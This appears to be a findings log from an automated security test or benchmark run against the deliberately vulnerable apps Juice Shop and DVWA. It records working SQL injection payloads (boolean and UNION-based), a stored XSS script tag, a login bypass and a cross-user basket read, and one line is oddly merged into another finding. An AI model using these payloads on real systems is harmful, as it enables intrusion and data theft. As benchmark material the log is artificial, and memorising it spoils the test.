findings.title: Juice Shop login authentication bypass SQL injection via email on /rest/user/login
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid token was issued for the first user admin@juice-sh.op without valid credentials. Token value redacted in the record.

findings.title: [security=high] SQL Injection via session-input.php id parameter (DVWA SQLi High)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page reads 'Security Level: high'
findings.response_evidence: [security=high] Security level page on dvwa_admin: 'Security level is currently: high' and 'Security Level: high' (note: tool session_info field displayed 'low' on all responses, but page body consistently shows high). Baseline id=1: exactly 1 record (First name: admin, Surname: admin). TRUE payload 1' OR '1'='1' # via session-input.php then GET /vulnerabilities/sqli/: 5 records returned - surnames admin, Brown, Me, Picasso, Smith (First names admin, Gordon, Hack, Pablo, Bob). FALSE payload 1' AND '1'='2' # then GET /vulnerabilities/sqli/: ZERO records - response contains 'Click here to change your ID .' with no 'ID:/First name:/Surname:' rows. The boolean TRUE/FALSE differential with multiple seeded surnames vs zero rows confirms SQL injection at high security via the session-stored id (the '#' comment neutralizes the trailing LIMIT 1).

findings.title: Stored XSS in guestbook message field (DVWA XSS (Stored)) [security=low]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> security level read as 'medium'
POST http://dvwa/security.php security=low&seclev_submit=Submit&user_token=[REDACTED] -> 302; session now reports security_level=low
GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> form token-less; fields txtName maxlength 10, mtxMessage maxlength 50
POST http://dvwa/vulnerabilities/xss_s/ txtName=bench&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook -> 200, entry stored
findings.response_evidence: [security=low] Security level was read as medium at start; reset to low via POST /security.php (session_info.security_level=low afterwards). Canary (exactly 50 chars, fits maxlength) submitted as mtxMessage with txtName=bench and btnSign. The stored entry rendered on /vulnerabilities/xss_s/ and the authenticated browser session evaluated window.xss_flag to 1. Browser JS evidence: {"expression":"String(window.xss_flag)","result":"1"}. Note: the server-side HTML text summary shows the entry as 'window.xss_flag=1' (tag not visible in text extraction), but the browser execution proves the script ran. Expected-behavior caveat: the stored canary persists in the guestbook.
findings.browser_js_evidence: window.xss_flag evaluated to "1" on http://dvwa/vulnerabilities/xss_s/ in dvwa_admin browser session at security=low.

findings.title: Juice Shop product search SQL injection (q parameter, unauthenticated) - SQLITE_ERROR and UNION injection
request_sequence: GET http://juiceshop:3000/rest/products/search?q=apple (unauth) -> 200 baseline, 2 products (Apple Juice, Apple Pomace)
findings.response_evidence: Baseline q=apple: HTTP 200 {\"status\":\"success\",\"data\":[Apple Juice (1000ml), Apple Pomace]}. q=qwert': HTTP 500 body 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]}, showing injected UNION columns reflected in the product record. Both the SQL error and the successful UNION injection were observed.

findings.title: DVWA /security.php: security-level state change verified; no vulnerability (configuration endpoint, out of CWE scope)
request_sequence: GET http://dvwa/security.php -> 'Security level is currently: medium' (token rotated to 675090adefd8d8aaf9d25d741f4370c7)
GET http://dvwa/security.php -> 'Security level is currently: high' (token fbba76abcf7b7b0db85a2d508d922df8)
GET http://dvwa/security.php -> 'Security level is currently: low' (reset complete)
findings.response_evidence: The endpoint behaves as described: the POST returns 302 and each subsequent GET reflects the new level (medium -> high -> low) in 'Security level is currently: X' and 'Security level set to X'. user_token rotates on every submit. Not a vulnerability by itself and no in-scope CWE applies; recorded as a verified state-change/configuration endpoint. Note: the session_info security_level field in the tool output lagged behind the page (still reported 'low' after the medium/high changes), so the page body was used as the authoritative indicator. Level restored to low.

findings.response_evidence: [security=medium] TRUE (id=1 OR 1=1): 5 records returned - surnames admin, Brown, Me, Picasso, Smith (first names admin, Gordon, Hack, Pablo, Bob). findings.title: GET /rest/user/whoami — no cross-user or credential disclosure (rejected as expected behavior)
request_sequence: GET http://juiceshop:3000/rest/user/whoami (juiceshop_acct1) -> 200 body {"user":{}}; session_info own_basket_id=6, email acct1_bench@juiceshop.local
GET http://juiceshop:3000/rest/user/whoami (juiceshop_acct2) -> 200 body {"user":{}}; session_info own_basket_id=7, email acct2_bench@juiceshop.local
findings.response_evidence: Both authenticated sessions received an identical-shape response with an empty user object: {"user":{}}. No other account's email, id, basket, token, or password hash was returned. Only the caller's own (minimal) identity context is exposed, so this is not a vulnerability. The own_basket_id data comes from the tool's session_info, not from the endpoint body.

findings.title: Cross-User Basket Access (BOLA) on GET /rest/basket/{basketId}: acct2 reads acct1 basket 6
findings.response_evidence: HTTP 200 {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","quantity":3,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Authenticated as acct2 (acct2_bench@juiceshop.local, own basket 7), the server returned acct1's basket 6 (UserId 22) containing Apple Juice (1000ml), quantity 3. Cross-user read of a non-owned basket confirmed (previously also confirmed for basket 7 per Coordinator).
